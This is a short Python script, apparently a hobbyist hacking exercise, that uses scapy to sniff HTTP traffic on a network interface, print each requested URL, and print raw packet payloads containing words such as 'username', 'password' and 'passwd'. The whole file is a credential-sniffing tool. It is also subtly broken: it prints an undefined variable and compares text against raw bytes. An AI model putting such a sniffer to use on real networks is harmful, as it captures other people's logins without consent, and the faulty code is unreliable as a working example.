import scapy.all as s
from scapy.layers import http

def sniff(interface):
	s.sniff(iface=interface, store=False, prn=proc_sniff)

def get_login(packet):
	if packet.haslayer(s.Raw):
			load = packet[s.Raw].load
			keywords = ["username","password","user","login","pass","passwd","id"]
			for k in keywords:
				if k in load:
					return load

def proc_sniff(packet):
	if packet.haslayer(http.HTTPRequest):
		url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
		print(f"[+] HTTP Request===> {url}")
		log_inf = get_login(packet)
		if log_inf:
			print(f"\n\n[+] This may be interesting=====>{load}\n\n")
#					break # break out of the current loop
		

sniff("en0")